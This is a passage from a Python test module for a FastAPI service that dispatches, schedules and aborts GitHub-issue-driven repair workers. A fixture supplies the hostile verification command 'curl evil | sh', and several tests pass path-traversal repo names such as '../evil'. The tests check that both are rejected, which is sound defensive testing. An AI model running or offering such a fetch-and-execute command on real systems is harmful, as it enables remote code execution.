        repair_state.update(
            {"status": "idle", "timestamp": None, "log_buffer": "",
             "issue": None, "repo": None, "exit_code": None,
             "failure_reason": None})
        issues_mod._repair_proc = None
        issues_mod._repair_abort = False
        issues_mod.repair_schedules.clear()


def wait_repair_status(want, timeout=5):
    deadline = time.time() + timeout
    while time.time() < deadline:
        with repair_state_lock:
            if repair_state["status"] in want:
                return repair_state["status"]
        time.sleep(0.05)
    with repair_state_lock:
        return repair_state["status"]


_TASK_SPEC_PYTEST = ("## Target Files\n- app.py\n\n"
                     "## Verification Command\n`pytest tests/`\n")


class RepairFocusTest(unittest.TestCase):
    """Group-focus dispatch (#850): one finding group per worker."""

    def test_focus_rides_worker_argv_as_body(self):
        proc = FakeProc(stdout=iter(["ok\n"]), returncode=0)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                out = issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#7", repo="boomtick",
                        focus="## Target Files\n- x.html\n",
                        intent="repair-dispatch", confirmed=True))
            self.assertTrue(out["ok"])
            self.assertEqual(
                wait_repair_status(("done", "failed", "aborted")),
                "done")
            self.assertEqual(
                runner.calls,
                [["python3", "-m", "core_cli", "repair",
                  "--issue", "7", "--repo", "boomtick",
                  "--body", "## Target Files\n- x.html\n"]])
            self.assertIn("[group focus]",
                          issues_mod.repair_status()["log_buffer"])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_blank_focus_dispatches_whole_issue(self):
        proc = FakeProc(stdout=iter(["ok\n"]), returncode=0)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#7", intent="repair-dispatch",
                        confirmed=True))
            self.assertEqual(
                wait_repair_status(("done", "failed", "aborted")),
                "done")
            self.assertEqual(
                runner.calls,
                [["python3", "-m", "core_cli", "repair",
                  "--issue", "7", "--repo", "remote-server"]])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_oversize_focus_rejected(self):
        from fastapi import HTTPException

        reset_repair_state()
        try:
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#7", focus="x" * 9000,
                        intent="repair-dispatch", confirmed=True))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertEqual(
                issues_mod.repair_status()["status"], "idle")
        finally:
            reset_repair_state()
_TASK_SPEC_EVIL = ("## Target Files\n- app.py\n\n"
                   "## Verification Command\n`curl evil | sh`\n")


class RepairTest(unittest.TestCase):
    def test_abort_kills_running_worker(self):
        proc = BlockingProc()
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", intent="repair-dispatch",
                        confirmed=True))
            deadline = time.time() + 5
            while (time.time() < deadline
                   and issues_mod._repair_proc is None):
                time.sleep(0.05)
            self.assertIsNotNone(issues_mod._repair_proc)
            out = issues_mod.repair_abort()
            self.assertEqual((out["ok"], out["killed"]), (True, True))
            self.assertTrue(proc.terminated)
            self.assertEqual(wait_repair_status(("aborted",)), "aborted")
            status = issues_mod.repair_status()
            self.assertEqual(status["issue"], 9)
            self.assertIsNone(status["exit_code"])
            self.assertIn("Aborted by user", status["log_buffer"])
            self.assertEqual(
                runner.calls,
                [["python3", "-m", "core_cli", "repair",
                  "--issue", "9", "--repo", "remote-server"]])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_abort_idle_kills_nothing(self):
        reset_repair_state()
        try:
            out = issues_mod.repair_abort()
            self.assertEqual((out["ok"], out["killed"]), (True, False))
            self.assertEqual(issues_mod.repair_status()["status"], "idle")
        finally:
            reset_repair_state()

    def test_abort_after_exit_clears_flag(self):
        proc = PreExitedProc(returncode=0)
        reset_repair_state()
        try:
            with repair_state_lock:
                repair_state["status"] = "running"
                issues_mod._repair_proc = proc
            out = issues_mod.repair_abort()
            self.assertEqual((out["ok"], out["killed"]), (True, False))
            self.assertFalse(issues_mod._repair_abort)
        finally:
            reset_repair_state()

    def test_late_abort_keeps_natural_completion(self):
        proc = LateAbortProc(stdout=iter(["line1\n"]), returncode=0)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", intent="repair-dispatch",
                        confirmed=True))
            self.assertEqual(
                wait_repair_status(("done", "failed", "aborted")), "done")
            status = issues_mod.repair_status()
            self.assertEqual(status["exit_code"], 0)
            self.assertIn("exited with code 0", status["log_buffer"])
            self.assertNotIn("Aborted by user", status["log_buffer"])
            self.assertEqual(
                runner.calls,
                [["python3", "-m", "core_cli", "repair",
                  "--issue", "9", "--repo", "remote-server"]])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_dispatch_and_status(self):
        from fastapi import HTTPException

        with self.assertRaises(HTTPException):
            issues_mod.repair_dispatch(
                issues_mod.RepairDispatchRequest(
                    issue="nope", intent="repair-dispatch",
                    confirmed=True))

        proc = FakeProc(stdout=iter(["line1\n"]), returncode=0)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                out = issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#5", intent="repair-dispatch",
                        confirmed=True))
            self.assertEqual(
                (out["ok"], out["issue"], out["status"]),
                (True, 5, "running"))
            deadline = time.time() + 5
            while time.time() < deadline:
                with repair_state_lock:
                    st = repair_state["status"]
                if st in ("done", "failed"):
                    break
                time.sleep(0.05)
            status = issues_mod.repair_status()
            self.assertEqual(status["issue"], 5)
            self.assertEqual(status["status"], "done")
            self.assertEqual(status["exit_code"], 0)
            self.assertIn("line1", status["log_buffer"])
            self.assertEqual(
                runner.calls[0],
                ["python3", "-m", "core_cli", "repair",
                 "--issue", "5", "--repo", "remote-server"])
        finally:
            issues_mod._repair_runner = old

    def test_verify_command_preview_allowlisted(self):
        with patch.object(issues_mod, "run_gh_json",
                          return_value={"body": _TASK_SPEC_PYTEST}):
            out = issues_mod.repair_verify_command("9")
        self.assertEqual(
            (out["ok"], out["issue"], out["command"],
             out["allowlisted"], out["error"]),
            (True, 9, "pytest tests/", True, ""))

    def test_verify_command_preview_rejected(self):
        with patch.object(issues_mod, "run_gh_json",
                          return_value={"body": _TASK_SPEC_EVIL}):
            out = issues_mod.repair_verify_command("#9")
        self.assertEqual(out["command"], "curl evil | sh")
        self.assertFalse(out["allowlisted"])
        self.assertIn("not allowlisted", out["error"])

    def test_verify_command_preview_unparseable(self):
        with patch.object(issues_mod, "run_gh_json",
                          return_value={"body": "just prose"}):
            out = issues_mod.repair_verify_command("9")
        self.assertEqual(out["command"], "")
        self.assertFalse(out["allowlisted"])
        self.assertIn("Target Files", out["error"])

    def test_dispatch_rejects_non_allowlisted(self):
        from fastapi import HTTPException

        runner = FakeRunner()
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_EVIL}):
                with self.assertRaises(HTTPException) as ctx:
                    issues_mod.repair_dispatch(
                        issues_mod.RepairDispatchRequest(
                            issue="#9", intent="repair-dispatch",
                            confirmed=True))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertIn("not allowlisted", ctx.exception.detail)
            self.assertEqual(runner.calls, [])
        finally:
            issues_mod._repair_runner = old

    def test_dispatch_accepts_branch_for_stack_checkout(self):
        # Explicit branch (#708): the default repo is remote-server,
        # so the branch validates against it. trigger_repair is
        # mocked, so the dispatch claim is reset by hand.
        reset_repair_state()
        try:
            with patch.object(
                    issues_mod, "_repair_verify_preview",
                    return_value={"allowlisted": True,
                                  "error": ""}), \
                    patch.object(issues_mod,
                                 "trigger_repair") as fired, \
                    patch("backend.core.validate_action_branch",
                          return_value="main") as branch_mock:
                out = issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", branch="main",
                        intent="repair-dispatch", confirmed=True))
                self.assertEqual(
                    out, {"ok": True, "issue": 9, "status": "running",
                          "repo": "remote-server"})
                branch_mock.assert_called_once_with(
                    "remote-server", "main")
                fired.assert_called_once_with(9, "remote-server")
        finally:
            reset_repair_state()

    def test_dispatch_rejects_unknown_branch(self):
        from fastapi import HTTPException

        with patch.object(
                issues_mod, "_repair_verify_preview",
                return_value={"allowlisted": True, "error": ""}), \
                patch.object(issues_mod, "trigger_repair") as fired, \
                patch("backend.core.validate_action_branch",
                      side_effect=ValueError("unknown branch: 'gone'")):
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", branch="gone",
                        intent="repair-dispatch", confirmed=True))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertIn("unknown branch", ctx.exception.detail)
            fired.assert_not_called()


class RepairFailureReasonTest(unittest.TestCase):
    """Titled worker failures lift into repair_state (#908)."""

    def _run_thread(self, lines, returncode):
        proc = FakeProc(stdout=iter(lines), returncode=returncode)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            # Synchronous: the thread body runs inline, no timing.
            issues_mod._repair_worker_thread(9, "remote-server")
            with repair_state_lock:
                return dict(repair_state)
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_marker_line_records_failure_reason(self):
        state = self._run_thread(
            ["ERROR:root:Repair pipeline encountered error: boom\n",
             "repair-unscaffolded: issue #9 is not scaffolded for "
             "repair: Missing required section: 'Target Files'\n"],
            1)
        self.assertEqual(state["status"], "failed")
        self.assertEqual(state["exit_code"], 1)
        self.assertIn("not scaffolded", state["failure_reason"])
        self.assertIn("Target Files", state["failure_reason"])
        self.assertNotIn("repair-unscaffolded:",
                         state["failure_reason"])

    def test_plain_failure_leaves_reason_empty(self):
        state = self._run_thread(["Traceback (most recent call)\n"], 2)
        self.assertEqual(state["status"], "failed")
        self.assertEqual(state["exit_code"], 2)
        self.assertIsNone(state["failure_reason"])

    def test_success_clears_reason(self):
        state = self._run_thread(["ok\n"], 0)
        self.assertEqual(state["status"], "done")
        self.assertIsNone(state["failure_reason"])


class RepairDispatchGuardTest(unittest.TestCase):
    """Confirm gate, single-flight, timeout, and repo scope (#435)."""

    def test_dispatch_requires_confirm(self):
        from fastapi import HTTPException

        runner = FakeRunner()
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                for kw in ({}, {"intent": "repair-dispatch"},
                           {"intent": "repair-dispatch",
                            "confirmed": False},
                           {"intent": "pr-merge", "confirmed": True}):
                    with self.assertRaises(HTTPException,
                                           msg=kw) as ctx:
                        issues_mod.repair_dispatch(
                            issues_mod.RepairDispatchRequest(
                                issue="#9", **kw))
                    self.assertEqual(ctx.exception.status_code, 400)
                    self.assertIn("confirmation required",
                                  ctx.exception.detail)
            self.assertEqual(runner.calls, [])
            with repair_state_lock:
                self.assertEqual(repair_state["status"], "idle")
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_second_dispatch_while_running_returns_409(self):
        from fastapi import HTTPException

        proc = BlockingProc()
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", intent="repair-dispatch",
                        confirmed=True))
                # Back-to-back: the atomic claim 409s even before the
                # worker thread writes running.
                with self.assertRaises(HTTPException) as ctx:
                    issues_mod.repair_dispatch(
                        issues_mod.RepairDispatchRequest(
                            issue="#10", intent="repair-dispatch",
                            confirmed=True))
                self.assertEqual(ctx.exception.status_code, 409)
                self.assertIn("busy", ctx.exception.detail)
                deadline = time.time() + 5
                while (time.time() < deadline
                       and issues_mod._repair_proc is None):
                    time.sleep(0.05)
                self.assertIsNotNone(issues_mod._repair_proc)
                # Still busy once the worker thread is up.
                with self.assertRaises(HTTPException) as ctx:
                    issues_mod.repair_dispatch(
                        issues_mod.RepairDispatchRequest(
                            issue="#10", intent="repair-dispatch",
                            confirmed=True))
                self.assertEqual(ctx.exception.status_code, 409)
                self.assertEqual(len(runner.calls), 1)
            out = issues_mod.repair_abort()
            self.assertTrue(out["killed"])
            self.assertEqual(wait_repair_status(("aborted",)), "aborted")
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_stuck_worker_times_out_to_failed(self):
        proc = BlockingProc()
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "REPAIR_WORKER_TIMEOUT",
                              0.3), \
                    patch.object(issues_mod, "run_gh_json",
                                 return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", intent="repair-dispatch",
                        confirmed=True))
                self.assertEqual(
                    wait_repair_status(("failed",), timeout=10),
                    "failed")
                status = issues_mod.repair_status()
            self.assertEqual(status["exit_code"], -15)
            self.assertTrue(proc.terminated)
            self.assertIn("timed out", status["log_buffer"])
            self.assertIn("killed", status["log_buffer"])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_wait_timeout_kills_and_fails(self):
        proc = TimeoutProc()
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", intent="repair-dispatch",
                        confirmed=True))
                self.assertEqual(
                    wait_repair_status(("failed",), timeout=10),
                    "failed")
                status = issues_mod.repair_status()
            self.assertTrue(proc.killed)
            self.assertEqual(status["exit_code"], -9)
            self.assertIn("timed out", status["log_buffer"])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_dispatch_scopes_repo(self):
        proc = FakeProc(stdout=iter(["line1\n"]), returncode=0)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}) as m:
                out = issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#5", repo="boomtick",
                        intent="repair-dispatch", confirmed=True))
            self.assertEqual(out["repo"], "boomtick")
            gh, argv = m.call_args[0][0], m.call_args[0][1]
            self.assertEqual(gh, "arii/boomtick")
            self.assertEqual(
                argv, ["issue", "view", "5", "--repo", "arii/boomtick",
                      "--json", "body"])
            self.assertEqual(
                runner.calls[0],
                ["python3", "-m", "core_cli", "repair",
                 "--issue", "5", "--repo", "boomtick"])
            self.assertEqual(
                wait_repair_status(("done", "failed", "aborted")), "done")
            self.assertEqual(
                issues_mod.repair_status()["repo"], "boomtick")
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_dispatch_rejects_bad_repo(self):
        from fastapi import HTTPException

        runner = FakeRunner()
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#5", repo="../evil",
                        intent="repair-dispatch", confirmed=True))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertEqual(runner.calls, [])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_verify_command_scopes_repo(self):
        from fastapi import HTTPException

        with patch.object(issues_mod, "run_gh_json",
                          return_value={"body": _TASK_SPEC_PYTEST}) as m:
            out = issues_mod.repair_verify_command("#9", "boomtick")
        self.assertTrue(out["allowlisted"])
        gh, argv = m.call_args[0][0], m.call_args[0][1]
        self.assertEqual(gh, "arii/boomtick")
        self.assertIn("arii/boomtick", argv)
        with self.assertRaises(HTTPException) as ctx:
            issues_mod.repair_verify_command("#9", "../evil")
        self.assertEqual(ctx.exception.status_code, 400)

    def test_dispatch_branch_validates_against_scoped_repo(self):
        # trigger_repair is mocked, so the dispatch claim is reset
        # by hand (same as the #708 test above).
        reset_repair_state()
        try:
            with patch.object(
                    issues_mod, "_repair_verify_preview",
                    return_value={"allowlisted": True,
                                  "error": ""}), \
                    patch.object(issues_mod,
                                 "trigger_repair") as fired, \
                    patch("backend.core.validate_action_branch",
                          return_value="main") as branch_mock:
                out = issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#9", repo="boomtick", branch="main",
                        intent="repair-dispatch", confirmed=True))
                self.assertEqual(out["repo"], "boomtick")
                branch_mock.assert_called_once_with("boomtick", "main")
                fired.assert_called_once_with(9, "boomtick")
        finally:
            reset_repair_state()


class RepairScheduleTest(unittest.TestCase):
    def test_set_daily_shows_next_run_24h_out(self):
        reset_repair_state()
        try:
            before = time.time()
            out = issues_mod.repair_schedule(
                issues_mod.RepairScheduleRequest(
                    issue="#11", cadence="daily"))
            sched = out["schedule"]
            self.assertTrue(out["ok"])
            self.assertEqual(
                (sched["issue"], sched["cadence"]), (11, "daily"))
            self.assertGreaterEqual(sched["next_run"], before + 86300)
            self.assertLessEqual(sched["next_run"], before + 86500)
            status = issues_mod.repair_status()
            self.assertEqual(len(status["schedules"]), 1)
            self.assertEqual(status["schedules"][0]["issue"], 11)
        finally:
            reset_repair_state()

    def test_set_weekly_and_disable(self):
        reset_repair_state()
        try:
            before = time.time()
            out = issues_mod.repair_schedule(
                issues_mod.RepairScheduleRequest(
                    issue=12, cadence="weekly"))
            sched = out["schedule"]
            self.assertGreaterEqual(
                sched["next_run"], before + 7 * 86400 - 100)
            out = issues_mod.repair_schedule(
                issues_mod.RepairScheduleRequest(
                    issue=12, cadence="off"))
            self.assertEqual(
                (out["ok"], out["schedule"]), (True, None))
            self.assertEqual(
                issues_mod.repair_status()["schedules"], [])
        finally:
            reset_repair_state()

    def test_rejects_bad_issue_and_cadence(self):
        from fastapi import HTTPException

        reset_repair_state()
        try:
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.repair_schedule(
                    issues_mod.RepairScheduleRequest(
                        issue="nope", cadence="daily"))
            self.assertEqual(ctx.exception.status_code, 400)
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.repair_schedule(
                    issues_mod.RepairScheduleRequest(
                        issue=9, cadence="hourly"))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertIn("daily", ctx.exception.detail)
        finally:
            reset_repair_state()

    def test_due_schedule_fires_worker_and_reschedules(self):
        proc = FakeProc(stdout=iter(["line1\n"]), returncode=0)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_schedule(
                    issues_mod.RepairScheduleRequest(
                        issue=13, cadence="daily"))
                with repair_state_lock:
                    issues_mod.repair_schedules[13]["next_run"] = (
                        time.time() - 1)
                fired = issues_mod.fire_due_schedules()
            self.assertEqual(fired, 13)
            self.assertEqual(
                wait_repair_status(("done", "failed", "aborted")),
                "done")
            status = issues_mod.repair_status()
            self.assertEqual(status["issue"], 13)
            self.assertIn("line1", status["log_buffer"])
            sched = status["schedules"][0]
            self.assertEqual(sched["issue"], 13)
            self.assertGreater(sched["next_run"], time.time())
            self.assertIsNotNone(sched["last_run"])
            self.assertEqual(
                runner.calls[0],
                ["python3", "-m", "core_cli", "repair",
                 "--issue", "13", "--repo", "remote-server"])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_due_schedule_skips_while_running(self):
        runner = FakeRunner()
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            issues_mod.repair_schedule(
                issues_mod.RepairScheduleRequest(
                    issue=14, cadence="daily"))
            with repair_state_lock:
                repair_state["status"] = "running"
                issues_mod.repair_schedules[14]["next_run"] = (
                    time.time() - 1)
            self.assertIsNone(issues_mod.fire_due_schedules())
            self.assertEqual(runner.calls, [])
            with repair_state_lock:
                self.assertLessEqual(
                    issues_mod.repair_schedules[14]["next_run"],
                    time.time())
                self.assertIsNone(
                    issues_mod.repair_schedules[14]["last_run"])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_due_schedule_skips_non_allowlisted(self):
        runner = FakeRunner()
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_EVIL}):
                issues_mod.repair_schedule(
                    issues_mod.RepairScheduleRequest(
                        issue=15, cadence="daily"))
                with repair_state_lock:
                    issues_mod.repair_schedules[15]["next_run"] = (
                        time.time() - 1)
                fired = issues_mod.fire_due_schedules()
            self.assertIsNone(fired)
            self.assertEqual(runner.calls, [])
            with repair_state_lock:
                self.assertGreater(
                    issues_mod.repair_schedules[15]["next_run"],
                    time.time())
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()

    def test_disable_stops_runs_but_dispatch_still_works(self):
        proc = FakeProc(stdout=iter(["line1\n"]), returncode=0)
        runner = FakeRunner()
        runner.handlers["popen"] = proc
        old = issues_mod._repair_runner
        issues_mod._repair_runner = runner
        reset_repair_state()
        try:
            with patch.object(issues_mod, "run_gh_json",
                              return_value={"body": _TASK_SPEC_PYTEST}):
                issues_mod.repair_schedule(
                    issues_mod.RepairScheduleRequest(
                        issue=16, cadence="daily"))
                issues_mod.repair_schedule(
                    issues_mod.RepairScheduleRequest(
                        issue=16, cadence="off"))
                self.assertIsNone(issues_mod.fire_due_schedules())
                self.assertEqual(runner.calls, [])
                out = issues_mod.repair_dispatch(
                    issues_mod.RepairDispatchRequest(
                        issue="#16", intent="repair-dispatch",
                        confirmed=True))
            self.assertEqual(
                (out["ok"], out["issue"], out["status"]),
                (True, 16, "running"))
            self.assertEqual(
                wait_repair_status(("done", "failed", "aborted")),
                "done")
            self.assertEqual(
                runner.calls,
                [["python3", "-m", "core_cli", "repair",
                  "--issue", "16", "--repo", "remote-server"]])
        finally:
            issues_mod._repair_runner = old
            reset_repair_state()


class RouteTableTest(unittest.TestCase):
    def test_routes_registered(self):
        pulls_routes = {(r.path, tuple(sorted(r.methods))) for r in
                        pulls_mod.router.routes}
        issues_routes = {(r.path, tuple(sorted(r.methods))) for r in
                         issues_mod.router.routes}
        self.assertIn(("/api/prs", ("GET",)), pulls_routes)
        self.assertIn(("/api/pr-details", ("GET",)), pulls_routes)
        self.assertIn(("/api/pr-diff", ("GET",)), pulls_routes)
        self.assertIn(("/api/pr-action", ("POST",)), pulls_routes)
        self.assertIn(("/api/issues", ("GET",)), issues_routes)
        self.assertIn(("/api/create-issue", ("POST",)), issues_routes)
        self.assertIn(("/api/issue-draft", ("POST",)), issues_routes)
        self.assertIn(("/api/repair/dispatch", ("POST",)), issues_routes)
        self.assertIn(("/api/repair/status", ("GET",)), issues_routes)
        self.assertIn(("/api/repair/schedule", ("POST",)), issues_routes)
        self.assertIn(
            ("/api/repair/verify-command", ("GET",)), issues_routes)
        self.assertIn(("/api/labels", ("GET",)), issues_routes)
        self.assertIn(("/api/issue-label", ("POST",)), issues_routes)


class RepoLabelsTest(unittest.TestCase):
    def test_list_returns_sorted_names(self):
        with patch.object(
                issues_mod, "run_gh_json",
                return_value=[{"name": "ready"}, {"name": "audit"},
                              {"name": "  "}, {"nope": 1}]) as m:
            out = issues_mod.repo_labels(repo="remote-server")
        self.assertEqual(out, {"repo": "remote-server",
                               "labels": ["audit", "ready"]})
        gh, argv = m.call_args[0][0], m.call_args[0][1]
        self.assertEqual(gh, "arii/remote-server")
        self.assertEqual(
            argv,
            ["label", "list", "--repo", "arii/remote-server",
             "--limit", "100", "--json", "name"])

    def test_list_bad_repo(self):
        from fastapi import HTTPException

        with self.assertRaises(HTTPException) as ctx:
            issues_mod.repo_labels(repo="nope/../evil")
        self.assertEqual(ctx.exception.status_code, 400)

    def test_list_gh_failure_is_500(self):
        from fastapi import HTTPException

        with patch.object(issues_mod, "run_gh_json",
                          side_effect=RuntimeError("boom")):
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.repo_labels(repo="remote-server")
        self.assertEqual(ctx.exception.status_code, 500)


class IssueLabelTest(unittest.TestCase):
    def test_add_argv(self):
        with patch.object(issues_mod, "run_gh",
                          return_value="") as m:
            out = issues_mod.issue_label(
                issues_mod.IssueLabelRequest(repo="remote-server",
                                             issue=7, label="audit",
                                             op="add"))
        self.assertEqual(out, {"ok": True, "issue": 7})
        gh, argv = m.call_args[0][0], m.call_args[0][1]
        self.assertEqual(argv, ["issue", "edit", "7", "--repo", gh,
                                "--add-label", "audit"])

    def test_remove_argv(self):
        with patch.object(issues_mod, "run_gh",
                          return_value="") as m:
            out = issues_mod.issue_label(
                issues_mod.IssueLabelRequest(repo="remote-server",
                                             issue="#7", label="audit",
                                             op="remove"))
        self.assertEqual(out, {"ok": True, "issue": 7})
        gh, argv = m.call_args[0][0], m.call_args[0][1]
        self.assertEqual(argv, ["issue", "edit", "7", "--repo", gh,
                                "--remove-label", "audit"])

    def test_validation(self):
        from fastapi import HTTPException

        bad = [
            {"issue": 7, "label": "audit", "op": "rename"},
            {"issue": 7, "label": "", "op": "add"},
            {"issue": 7, "label": "   ", "op": "add"},
            {"issue": 7, "label": "x" * 101, "op": "add"},
            {"issue": "nope", "label": "audit", "op": "add"},
            {"issue": 0, "label": "audit", "op": "add"},
            {"issue": True, "label": "audit", "op": "add"},
        ]
        for kw in bad:
            with self.assertRaises(HTTPException, msg=kw) as ctx:
                issues_mod.issue_label(
                    issues_mod.IssueLabelRequest(repo="remote-server",
                                                 **kw))
            self.assertEqual(ctx.exception.status_code, 400)

    def test_bad_repo(self):
        from fastapi import HTTPException

        with self.assertRaises(HTTPException) as ctx:
            issues_mod.issue_label(issues_mod.IssueLabelRequest(
                repo="nope/../evil", issue=7, label="audit", op="add"))
        self.assertEqual(ctx.exception.status_code, 400)

    def test_gh_failure_is_500(self):
        from fastapi import HTTPException

        with patch.object(issues_mod, "run_gh",
                          side_effect=RuntimeError("boom")):
            with self.assertRaises(HTTPException) as ctx:
                issues_mod.issue_label(issues_mod.IssueLabelRequest(
                    repo="remote-server", issue=7, label="audit",
                    op="add"))
        self.assertEqual(ctx.exception.status_code, 500)


class ScheduleTickLoopTest(unittest.TestCase):
    def _run_ticks(self, ticks):
        import backend.notify as notify_mod
        from backend.api.routers import jobs as jobs_mod

        calls = []
        sleeps = []

        class Done(Exception):
            pass

        def fake_sleep(_secs):
            calls.append("sleep")
            sleeps.append(1)
            if len(sleeps) > ticks:
                raise Done()

        with patch.object(issues_mod.time, "sleep",
                          side_effect=fake_sleep), \
                patch.object(issues_mod, "fire_due_schedules",
                             side_effect=lambda: calls.append(
                                 "schedules")), \
                patch.object(notify_mod, "fire_due_digest",
                             side_effect=lambda: calls.append(
                                 "digest")), \
                patch.object(notify_mod, "fire_budget_watch",
                             side_effect=lambda: calls.append(
                                 "budget")), \
                patch.object(jobs_mod, "fire_due_action_schedules",
                             side_effect=lambda: calls.append(
                                 "actions")):
            with self.assertRaises(Done):
                issues_mod._schedule_tick_loop()
        return calls

    def test_tick_runs_all_four_jobs(self):
        calls = self._run_ticks(2)
        self.assertEqual(
            calls,
            ["sleep", "schedules", "digest", "budget", "actions",
             "sleep", "schedules", "digest", "budget", "actions",
             "sleep"])

    def test_tick_survives_job_errors(self):
        import backend.notify as notify_mod
        from backend.api.routers import jobs as jobs_mod

        ticks = []

        class Done(Exception):
            pass

        def fake_sleep(_secs):
            ticks.append(1)
            if len(ticks) > 2:
                raise Done()

        budget_calls = []
        actions_calls = []

        def boom_budget():
            budget_calls.append(1)
            raise RuntimeError("notify down")

        def boom_actions():
            actions_calls.append(1)
            raise RuntimeError("jobs down")

        with patch.object(issues_mod.time, "sleep",
                          side_effect=fake_sleep), \
                patch.object(issues_mod, "fire_due_schedules",
                             side_effect=RuntimeError("repair down")), \
                patch.object(notify_mod, "fire_due_digest",
                             return_value=False), \
                patch.object(notify_mod, "fire_budget_watch",
                             side_effect=boom_budget), \
                patch.object(jobs_mod, "fire_due_action_schedules",
                             side_effect=boom_actions):
            with self.assertRaises(Done):
                issues_mod._schedule_tick_loop()
        self.assertEqual(len(ticks), 3)
        self.assertEqual(len(budget_calls), 2)
        self.assertEqual(len(actions_calls), 2)


def _gate_view(**over):
    view = {"number": 7, "baseRefName": "main",
            "reviewDecision": "APPROVED",
            "mergeStateStatus": "CLEAN",
